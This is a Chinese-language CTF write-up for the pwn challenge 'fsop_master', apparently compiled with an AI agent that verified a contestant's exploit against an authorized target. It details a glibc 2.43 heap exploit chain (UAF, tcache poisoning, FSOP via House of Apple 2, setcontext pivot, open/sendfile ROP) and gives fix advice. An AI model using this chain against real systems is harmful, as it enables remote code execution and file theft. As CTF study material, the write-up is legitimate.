# fsop_master（06-fsop） · 渗透记录

> **脚本来源**：本题 exploit 脚本由参赛者本人手搓提供，Agent 负责在目标环境复现、验证、排错与题解/记录整理。


## 2.1 基本信息
| 字段 | 内容 |
|---|---|
| 题目 | fsop_master（06-fsop） |
| 类型 | Pwn / 堆 UAF + tcache 投毒 + FSOP（House of Apple 2）+ seccomp ORW |
| 入口 | 219.216.64.241:36813（附件：attachments/pwn + libc.so.6 2.43 + ld-linux） |
| 耗时 | 0 日 0 时 39 分 35 秒 |
| LLM | deepseek-flash |
| flag | `nex{1Sop_Ma573R_2f60ntat}` |

## 2.2 目标与授权
- 授权范围：仅用户给定的 219.216.64.241:36813；只读 cwd 的 flag，未在靶机落文件/未横向
- 禁止动作：DoS、横向移动、持久化、读取无关数据

## 2.3 侦察与指纹
ELF64 PIE + canary + NX + Full RELRO；seccomp 仅禁 execve(59)/execveat(322)，其余放行 → 必须 ORW；菜单 1.add/2.del/3.edit/4.show/5.exit；add 固定 malloc(0x100)、delete 不置空、edit read 0x108 后强制 NUL、show write 0x10；glibc 2.43（tcache 懒分配、每 bin 16 项）

## 2.4 攻击面
1) delete 后 UAF（show 读 / edit 写）2) edit 尾部 off-by-null 3) tcache 投毒 → 任意地址分配 4) 打 _IO_2_1_stdout_ 做 FSOP

## 2.5 漏洞判定
- 类型：Pwn / 堆 UAF + tcache 投毒 + FSOP（House of Apple 2）+ seccomp ORW
- 位置：delete/edit/show 的 UAF（vuln/menu 函数），配合 tcache 与 stdout FILE 结构
- 证据：evidence/step1_run.txt、step2_run.txt（两次独立连接，heap base / libc base 均不同，回显同一 flag `nex{1Sop_Ma573R_2f60ntat}`）；agent_exp.py 为原始脚本，exp.py 为适配版（context.timeout=3、默认 remote、flag 路径 flag）
- 误报排除：两次独立跑 ASLR 不同仍同 flag；libc base 页对齐（leak-0x212AC8）；0x440 路由与 tcache 容量无关（idx 66 ≥ 64 bins）；flag 由 sendfile 直接写到 socket，非猜测；open 失败时无回显、open 成功才出 flag，路径已用 cwd 的 `flag` 验证

## 2.6 利用链
```
9×add -> dele(0),dele(1) -> show(0) 得 heap_base（safe-linking 尾块 fd=c0>>12）
edit(1, mangle(c1, c3-0x10)) -> add(9)(c1), add(10)(c3-0x10)
edit(10, p64(0)+p64(0x441)) 伪造 c3->size
 dele(3) -> idx=(0x440-0x20)/0x10=66 ≥ 64 -> 跳过 tcache 进 unsorted
show(3) -> fd = main_arena+0x60 = libc+0x212AC8 -> libc_base
dele(2),dele(4) -> edit(4, mangle(c4, _IO_2_1_stdout_)) -> add(11)(W=c4), add(12)(stdout)
edit(9, V+0x68=setcontext+0x3D)
edit(2, path="flag")；edit(11, ROP@W)；edit(12, fake FILE@stdout)
exit(5) -> _IO_cleanup -> _IO_flush_all -> _IO_wfile_overflow -> _IO_wdoallocbuf
  -> call [wide_vtable+0x68]，rdx=rdi=fp=stdout -> setcontext+0x3D: rsp=[rdx+0xa0]=W
ROP: pop rdi;path / pop rsi;0 / open / pop rdi;1 / pop rsi;3 / mov rdx,r8(=0) / sendfile(1,3,NULL,huge) / _exit
回显：nex{1Sop_Ma573R_2f60ntat}
```

## 2.7 影响
堆 UAF 升级为任意地址分配 + FILE 结构劫持，远端任意代码执行；seccomp 只挡 execve，仍可 open/read/sendfile 读任意文件

## 2.8 修复建议
delete 后置空指针并校验已释放状态；edit 严格限制长度；不要用可被 UAF 改写的 tcache fd；FILE 的 vtable 校验需覆盖 wide vtable（glibc 默认不校验）；seccomp 收紧到仅 write/exit；flag 放独立只读挂载

## 2.9 复盘
2.43 tcache 懒分配且 16 项，靠 0x440 跳过 tcache 泄 libc；FSOP 后 rdx 版 setcontext 迁到堆；远程 flag 在 cwd 的 flag。
